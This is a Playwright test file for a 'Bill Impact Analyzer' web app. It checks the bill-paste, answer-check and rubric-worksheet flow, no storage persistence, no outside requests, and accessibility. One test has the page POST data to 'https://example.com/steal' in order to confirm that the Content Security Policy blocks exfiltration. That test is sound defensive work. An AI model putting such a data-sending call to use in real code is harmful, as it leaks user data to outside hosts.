import { readFileSync } from "node:fs";
import { expect, test } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { htmlToBill } from "../src/lib/billText";

const billText = htmlToBill(readFileSync("tests/fixtures/bill.html", "utf8")).text;
const answer = readFileSync("tests/fixtures/answer.json", "utf8");

test("core loop: paste bill → answer → example rubric → worksheet, with no CSP violations or outside requests", async ({ page, baseURL }) => {
  const problems: string[] = [];
  const outside: string[] = [];
  page.on("console", (m) => {
    if (m.type() === "error") problems.push(m.text());
  });
  page.on("request", (r) => {
    const u = r.url();
    if (!u.startsWith(baseURL!) && !u.startsWith("data:") && !u.startsWith("blob:")) outside.push(u);
  });

  await page.goto("/");
  await expect(page.getByRole("heading", { level: 1, name: "Bill Impact Analyzer" })).toBeVisible();

  // Step 1 via the paste path (FR-2)
  await page.getByText("Or paste the bill text yourself").click();
  await page.getByLabel("Bill ID or name").fill("AB 999 2025");
  await page.getByLabel("Bill text", { exact: true }).fill(billText);
  await page.getByRole("button", { name: "Use this text" }).click();
  await expect(page.getByText("AB 999, 2025–26").first()).toBeVisible();

  // Step 2 prompt exists and holds no rubric content
  await page.getByText("Show the prompt").click();
  const prompt = await page.locator("#prompt-box").inputValue();
  expect(prompt).toContain("NEW_REPORT");
  expect(prompt).not.toContain("IT Specialist");

  // Step 3/4
  await page.getByLabel("The JSON your AI returned").fill(answer);
  await page.getByRole("button", { name: "Check answer" }).click();
  await expect(page.getByText("Every quote was found in the bill text.")).toBeVisible();

  // Step 5/6
  await page.getByRole("button", { name: "Try the example (made-up numbers)" }).click();
  await expect(page.getByText(/Loaded rubric.example.json/)).toBeVisible();
  const devRow = page.getByRole("row", { name: /Development/ });
  await expect(devRow).toContainText("480");
  await expect(devRow).toContainText("160");

  await page.screenshot({ path: "test-results/worksheet.png", fullPage: true });

  // S-5: nothing persisted
  const stored = await page.evaluate(() => ({ ls: window.localStorage.length, ss: window.sessionStorage.length, ck: document.cookie }));
  expect(stored).toEqual({ ls: 0, ss: 0, ck: "" });

  // S-3: no CSP violations; S-4: no third-party requests
  expect(problems.filter((p) => /Content Security Policy|CSP/i.test(p))).toEqual([]);
  expect(outside).toEqual([]);
});

test("CSP blocks a script from sending data to another host (S-3)", async ({ page }) => {
  await page.goto("/");
  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/steal", { method: "POST", body: "rubric" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});

for (const path of ["/", "/nonsense-page"]) {
  test(`axe: zero critical or serious violations on ${path} (Readiness 0.8)`, async ({ page }) => {
    await page.goto(path);
    const results = await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21a", "wcag21aa"]).analyze();
    const bad = results.violations.filter((v) => v.impact === "critical" || v.impact === "serious");
    expect(bad.map((v) => `${v.id}: ${v.help}`)).toEqual([]);
  });
}
